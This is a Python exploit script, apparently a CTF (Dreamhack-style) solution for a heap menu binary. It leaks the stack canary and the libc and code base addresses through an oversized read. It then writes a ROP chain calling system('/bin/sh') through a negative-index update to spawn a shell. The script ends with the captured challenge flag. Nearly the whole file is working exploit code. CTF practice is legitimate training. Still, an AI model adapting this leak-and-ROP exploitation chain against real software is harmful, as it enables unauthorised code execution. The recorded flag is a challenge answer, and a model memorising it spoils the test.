#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    # log_level='debug',
    binary=ELF('./prob_patched', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
d2d_ida
brva 0x12AE
brva 0x1352
brva 0x144E
brva 0x1545
brva 0x15E1
brva 0x16B4
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal=['tmux', 'new-window', '-n', 'GDB-Debug', '-P', '-d']) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def create(size: int, data: bytes):
    sla(b'> ', b'1')
    slna(b'size: ', size)
    sa(b'data: ', data)

def read(idx: int):
    sla(b'> ', b'2')
    slna(b'index: ', idx)

def update(idx: int, size: int, data: bytes):
    sla(b'> ', b'3')
    slna(b'index: ', idx)
    slna(b'size: ', size)
    sa(b'data: ', data)

def delete(idx: int):
    sla(b'> ', b'4')
    slna(b'index: ', idx)

# ==================== EXPLOIT ====================
p = start()

create(40, b'0'*40)
create(40, b'2'*40)

sla(b'> ', b'1')
slna(b'size: ', 4096)

read(2)

data = r(4096)

canary = u64(data[0x180:0x188])
slog('canary @ %#x', canary)

libc.address = u64(data[0x190:0x198]) - 0x2a1ca
slog('libc base @ %#x', libc.address)

exe.address = u64(data[0x1b0:0x1b8]) - exe.sym.main
slog('code base @ %#x', exe.address)

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

update(-2, 40, flat({
    0x10: [
        pop_rdi,
        next(libc.search(b'/bin/sh\0')),
        libc.sym.do_system+2
    ]
}, filler=b'\0'))

interactive()
# DH{21873838:2Oehnjollr4JmPj2vdGI6w==}
